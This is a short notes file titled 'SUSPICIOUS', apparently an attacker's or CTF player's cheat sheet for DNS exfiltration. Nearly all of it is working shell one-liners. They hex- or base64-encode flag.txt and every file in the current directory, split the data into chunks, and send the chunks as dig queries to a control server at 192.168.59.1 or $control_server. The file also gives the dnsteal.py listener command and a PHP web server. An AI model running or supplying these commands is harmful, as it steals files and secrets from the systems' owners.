# SUSPICIOUS



for b in $(xxd -p flag.txt); do dig @192.168.59.1 $b.filename.com; done

```bash

for f in $(ls .); do s=40;b=500;c=0; for r in $(for i in $(gzip -c $f | base64 -w0 | sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s" ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do dig @$control_server `echo -ne $r$f|tr "+" "*"` +short; done; done

for f in $(ls .); do s=40;b=500;c=0; for r in $(for i in $(gzip -c $f | base64 -w0 | sed "s/.\{$b\}/&\n/g");do if [[ $c -lt $s ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do echo -ne $r$f|tr "+" "*"; done; done

for f in $(ls . -a); do s=4;b=40;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i."; c=$(($c+1)); else echo -ne "\n$i."; c=1; fi; done ); do dig @192.168.59.1 `echo -ne $r$f|tr "+" "*"|tr ".." "."` +short; done ; done
```

sudo python dnsteal.py 192.168.59.1 -z -s 4 -b 40 -f 3

sudo php -S 0.0.0.0:80